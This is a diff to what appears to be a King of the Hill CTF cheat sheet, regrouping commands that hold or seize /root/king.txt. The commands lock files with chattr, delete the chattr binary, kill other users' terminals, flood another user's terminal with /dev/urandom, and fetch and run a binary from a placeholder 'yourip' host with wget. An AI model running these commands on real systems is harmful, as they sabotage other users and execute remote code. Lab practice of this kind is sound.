@@ -223,23 +223,36 @@ find / -name '*flag*' -ls 2>/dev/null
 -oHostKeyAlgorithms=+ssh-rsa
 ```
 ## KoTH Tricks ✅
+
+### Be-king ✅
 ```bash
 set write off
-chattr +ai /root/king.txt
-chattr -ai /root/king.txt
+chattr +ia /root/king.txt
+chattr +ia /root
 rm -rf /usr/bin/chattr
-pkill -9 -t pts/1
-echo 'set -o noclobber' >> ~./.bashrc
-set -o noclobber /root/king.txt
-set +o noclobber /root/king.txt
-sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
 echo "USERNAME" >| /root/king.txt
+set -o noclobber /root/king.txt
+sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
+```
+### Not_Be-king ✅
+```bash
+chattr -ia /root
+chattr -ia /root/king.txt
 
-cat /dev/urandom > /dev/pts/# ( sending spam for another user )
+set +o noclobber /root/king.txt
 
+sudo umount -l /root
+sudo umount -l /root/king.txt
+```
+
+### Command_useful ✅
+```bash
 wget http://yourip/nyancat
 chmod +x nyancat 
 ./nyancat > /dev/$pts
+
+pkill -9 -t pts/1
+cat /dev/urandom > /dev/pts/# ( sending spam for another user )
 
 PATH=0
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
